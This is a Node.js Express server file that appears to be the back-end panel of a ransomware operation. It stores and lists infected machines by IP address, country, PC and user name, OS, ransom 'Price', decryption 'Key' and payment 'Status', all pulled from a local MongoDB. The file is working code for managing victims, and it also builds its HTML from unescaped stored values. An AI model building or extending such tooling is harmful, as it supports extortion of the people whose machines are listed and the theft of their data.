'use strict';
const express = require('express');
const path = require('path');
const app = express();
const mongoose = require("mongoose");
const Schema = mongoose.Schema;

const userScheme = new Schema({

    ID: String,
    IPAddress: String,
    Country: String,
    Flag: String,
    PC: String,
    User: String,
    OS: String,
    TimeZone: String,
    DateTime: String,
    Price: String,
    Key: String,
    Status: String

}, { versionKey: false });

mongoose.connect("mongodb://localhost:27017/usersdb", { useUnifiedTopology: true, useNewUrlParser: true, useFindAndModify: false }, function (err) {

    if (err) {
        return console.log(err)
    }

    app.listen(3000);
});

app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'hbs');
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', function (_req, res) {

    const Users = mongoose.model("Users", userScheme);
    const dataHTML = new Set();

    Users.find({}, { _id: false }, function (err, docs) {

        if (err) {
            return console.log(err);
        }

        for (var dataUser of docs) {

            dataHTML.add("<tr>" +
                `<td><span class="ID">${dataUser["ID"]}</span></td>` +
                `<td>${dataUser["IPAddress"]}</td>` +
                `<td>${dataUser["Country"]}</td>` +
                `<td><img src="/Flags/${dataUser["Flag"]}.svg" width="40" height="30"></td>` +
                `<td>${dataUser["PC"]}</td>` +
                `<td>${dataUser["User"]}</td>` +
                `<td>${dataUser["OS"]}</td>` +
                `<td>${dataUser["TimeZone"]}</td>` +
                `<td>${dataUser["DateTime"]}</td>` +
                `<td><span class="Price">${dataUser["Price"]}</span></td>` +
                `<td><span class="Key">${dataUser["Key"]}</span></td>` +
                `<td><span class="Status">${dataUser["Status"]}</span></td>` +
                "</tr>");
        }

        res.render('index', { data: Array.from(dataHTML).reverse() });
    });
});